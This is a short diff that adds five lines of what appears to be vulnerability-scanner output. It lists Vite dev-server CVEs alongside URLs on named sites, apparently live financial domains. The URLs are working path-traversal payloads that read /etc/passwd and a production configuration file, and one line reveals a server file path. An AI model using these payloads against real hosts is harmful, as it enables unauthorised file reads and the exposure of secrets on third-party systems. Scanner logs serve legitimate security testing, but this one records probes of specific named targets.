@@ -1,0 +1,5 @@
+[CVE-2025-30208] [http] [medium] https://www.angle.money/etc/passwd?raw
+[CVE-2025-30208] [http] [medium] https://xbanking.org/etc/passwd?raw??
+[CVE-2025-31125] [http] [medium] https://xbanking.org/@fs/etc/passwd?import&?inline=1.wasm?init
+[CVE-2026-39365] [http] [medium] https://xbanking.org/node_modules/.vite/deps/../../../config.production.js.map ["/var/www/xbanking/landing/config.production.js"]
+[CVE-2025-31486] [http] [medium] https://xbanking.org/etc/passwd?.svg?.wasm?init
